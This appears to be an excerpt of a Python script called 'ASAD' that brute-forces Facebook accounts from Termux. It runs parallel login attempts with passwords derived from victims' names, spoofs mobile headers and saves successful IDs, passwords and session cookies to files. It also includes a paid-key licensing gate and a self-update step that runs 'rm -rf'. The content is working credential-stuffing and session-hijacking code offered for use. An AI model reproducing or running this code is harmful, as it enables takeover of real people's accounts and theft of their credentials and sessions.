...
def Setup():
	try:
		...
		if '8.7.2' in httpx.get(url).text:
			...
			time.sleep(1)
			os.system('rm -rf New && python ASAD.py')
			exit()
	except ValueError:exit()
try:import httpx
except:exit(' Found error in http module! ')
xx=requests.get('https://raw.githubusercontent.com/ASAD110/files/main/ua.txt').text.splitlines()
def clear():
	os.system('clear')
	print(logo)
logo=("""\033[1;37m
...
----------------------------------------------
 Author    : ASAD 
 Status    : FREE
 Version   : 13.0\033[1;37m
 ok ids will be saved in ASAD folder
----------------------------------------------""")
def line():
	print(f'\033[1;37m------------------------------------------------')
myid=uuid.uuid4().hex[:5].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.mrASADxxx-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.mrASADxxx-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrASADxxx-cov', 'r').read()
kex=(f"ASAD-XD{uid}TS{key1}110E==")
...
def apv():
	try:
		...
		if kex in link:clear();main()
			...
			line()
			tks = ("Hi ASAD Sir, I Need To Buy Your Paid ASAD Tools Version 8.7.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
			subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
			print(' Run :  python ASAD.py')
			line()
			exit()
	except ValueError:
		exit()
...
def file():
	...
	with tred(max_workers=20) as ASAD:
		clear()
		tl = str(len(fo))
		...
		for user in fo:
			...
			passlist = plist
			if mthd =='1':
				ASAD.submit(m1,ids,names,passlist,fbcr)
			elif mthd =='2':
				ASAD.submit(m2,ids,names,passlist,fbcr)
			elif mthd =='3':
				ASAD.submit(m3,ids,names,passlist,fbcr)
			else:
				ASAD.submit(m2,ids,names,passlist,fbcr)
	print('\033[1;37m')
	line()
...
def m1(ids,names,passlist,fbcr):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [ASAD-M1] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			ua = "Mozilla/5.0 (Linux; Android 13; TECNO CI8n Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]",
			head = {    "method": 'GET', 
    "path": '/',
    "scheme": 'https', 
    ...
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5742.203", "Google Chrome";v="114.0.5742.203"',
    'sec-ch-ua-mobile': '?1',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; M40_EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5742.203 Mobile Safari/537.36',
    'viewport-width': '980', 
}
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [ASAD-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/ASAD/ASAD-M1-OK.txt','a').write(ids+'|'+pas+'\n')
				...
				open('/sdcard/ASAD/ASAD-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def m2(ids,names,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [ASAD-M2] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
    ...
    'viewport-width': '980', 
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [ASAD-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/ASAD/ASAD-M2-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/ASAD/ASAD-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
...
def m3(ids,names,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [ASAD-M3] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [ASAD-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/ASAD/ASAD-M3-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/ASAD/ASAD-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def rd(ids,passlist,fbcr):
    ...
    'viewport-width': '980',
			...
			if "session_key" in po:
				uid = str(po['uid'])
				token = po['access_token']
				print('\r\r\033[1;32m [ASAD-OK] '+uid+' | '+pas)
				oks.append(ids)
				open('/sdcard/ASAD/ASAD-R-OK.txt','a').write(uid+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/ASAD/ASAD-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
